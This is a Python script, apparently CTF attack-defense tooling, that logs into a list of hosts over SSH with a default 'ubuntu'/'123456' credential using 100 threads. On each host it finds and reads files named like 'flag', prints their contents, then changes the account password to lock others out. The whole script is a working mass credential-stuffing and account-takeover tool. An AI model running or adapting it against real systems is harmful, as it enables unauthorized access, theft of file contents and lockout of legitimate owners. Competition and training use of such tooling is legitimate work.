import paramiko
import socket
import threading
import time

def SSH(Ip,user,old_password,new_password):
    ssh = paramiko.SSHClient()
    # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=Ip, port=22, username=user, password=old_password,timeout=5)
        command = "passwd %s\n" %(user)
        stdin, stdout,stderr = ssh.exec_command('ls /')
        flag = str(stdout.read(),'utf-8')
        for i in flag.split('\n'):
            if 'flag' in i:
                com = 'cat /'+i.strip()
                stdin1, stdout1, stderr1 = ssh.exec_command(com)
                flag = str(stdout1.read(), 'utf-8')
                print(Ip+'-'+flag)
                break
        stdin, stdout, stderr = ssh.exec_command(command)
        #\n模拟回车 输一次旧密码、两次新密码
        stdin.write(old_password+'\n'+new_password + '\n' + new_password + '\n')
        out, err = stdout.read(), stderr.read()
        successful = 'password updated successfully'
        if successful in str(err):
            print(Ip + " 密码修改成功！")
        else:
            print('\033[31m错误：\033[0m' + str(err))
            print(Ip + " 密码修改失败！")
        ssh.close()
    except paramiko.ssh_exception.AuthenticationException as e:
        print(Ip + ' ' + '\033[31m账号密码错误!\033[0m')
        with open('nossh.txt','a') as f:
            f.write(Ip + '\n')
    except socket.timeout as e:
        print(Ip + ' ' + '\033[31m连接超时！\033[0m')
        with open('timeoutssh','a') as f:
            f.write(Ip + '\n')
    except :
        print(Ip + ' ' + '\033[31mIP异常！\033[0m')

if __name__ == "__main__":
    user = 'ubuntu'
    old_password = '123456'
    new_password = 'admin#'
    threads = 100
    with open('ip.txt','r') as f:
        for i in f.readlines():
                IP = i.strip()
                # 当线程过高，休息一会儿
                while (threading.activeCount() > threads):
                    time.sleep(1)
                t1 = threading.Thread(target=SSH, args=(IP,user,old_password,new_password))
                t1.start()